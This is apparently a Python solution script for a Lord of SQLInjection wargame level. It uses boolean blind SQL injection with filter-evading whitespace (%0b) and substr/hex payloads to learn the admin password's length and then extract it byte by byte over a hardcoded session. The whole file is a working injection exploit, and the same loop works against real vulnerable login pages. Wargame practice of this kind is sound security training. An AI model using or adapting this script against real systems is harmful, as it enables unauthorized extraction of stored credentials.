#-*-coding:utf-8-*-
from urllib import parse
import requests

length = 0

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
PHPSESSID = 'a1492brmg3qkjsebngf5n58db7'

START_OF_PAYLOAD = "?pw=1234%27%0bor%0bid=%27admin%27%0band%0bsubstr(hex(pw),"
MIDDLE_OF_PAYLOAD = ",1)="
END_OF_PAYLOAD = ";%0b--%0b"

true_result = '<h2>Hello admin</h2>'

byteArr = ''
answer = ''

cookie = {'PHPSESSID':PHPSESSID}
cnt = 0

for x in range(1, 100):
    param = "?pw=' or id='admin' and LENGTH(hex(pw))=" + str(x) + "%23"
    new_url = url + param
    response = requests.get(new_url, cookies=cookie)

    if response.text.find(true_result) > -1:
        length = x + 1
        print("pw의 길이는 "+str(length-1))
        break


for idx in range(1, length):
    for hex_data in range(256):
        param = START_OF_PAYLOAD + str(idx) + MIDDLE_OF_PAYLOAD + format(hex_data, '#04x') + END_OF_PAYLOAD
        new_url = url + param
        response = requests.get(new_url, cookies=cookie)

        if response.text.find(true_result) > -1:
            byteArr+=chr(hex_data)
            print(str(idx) + "번째 문자 : "+format(hex_data, '#04x'))
            break

n = 4
byteArr = [int(byteArr[i : i + n], 16) for i in range(0, len(byteArr), 4)]
print('hex str : ', byteArr)
byteArr = list(filter(lambda num: num != 0, byteArr))
print('unicode arr : ', byteArr)

for elem in byteArr:
    answer += chr(elem)

print('Answer is ', answer)


response = requests.get(url+"?pw="+parse.quote(answer), cookies=cookie)

if response.text.find('Clear!') > 0:
    print('Stage Clear')
else:
    print('Not yet')

# Blind SQL Injection using UNICODE
# 유니코드를 이용한 blind sql injection 공격